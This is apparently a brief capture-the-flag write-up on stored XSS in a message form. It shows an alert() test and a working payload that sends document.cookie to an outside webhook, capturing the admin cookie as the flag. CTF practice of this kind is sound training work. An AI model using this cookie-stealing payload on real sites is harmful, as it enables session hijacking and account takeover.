Read the documents, it is getting started. The form to post a message is certainly XSS injectable.

To check this, we can just inject

```
<script>alert('123')</script>
```

An alert window pops up, so we can inject javascript code. To get the cookie, we are going to put the cookie into a link, and request that link. You can request your own server, or create a beeceptor endpoint. Mine will be called ayaya, and available at the address: https://ayaya.free.beeceptor.com

Then, we can inject the following code in the form:

```
<script>document.write('<img src="https://ayaya.free.beeceptor.com/?cookie='+document.cookie+'"></img>');</script>
```

Wait some time, and you will see a request on your webhook:

```
/?cookie=ADMIN_COOKIE=...
```

The flag is the admin cookie !
